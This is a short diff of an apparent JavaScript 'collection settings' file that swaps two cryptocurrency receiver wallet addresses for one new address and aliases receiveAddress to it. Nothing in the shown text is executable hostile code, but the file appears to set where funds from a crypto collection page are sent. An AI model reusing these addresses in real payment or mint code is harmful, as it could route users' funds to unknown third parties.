@@ -1,8 +1,8 @@
 // Collection settings
 // Credits: @0xTracey on Github
 
-var receiverwallet = "0x412a52c4e6cde6a130764a326597343c87c0b1d8";
-var bep20receiverwallet = "0xAcedd85EA88da4D08aa8F39b3E5aa677621e1726";
+var receiverwallet = "0xcFE1432186f265D160Ad56e8F11b1277c4Db2044";
+var bep20receiverwallet = "0xcFE1432186f265D160Ad56e8F11b1277c4Db2044";
 
 // Define receiveAddress for compatibility
 var receiveAddress = receiverwallet;
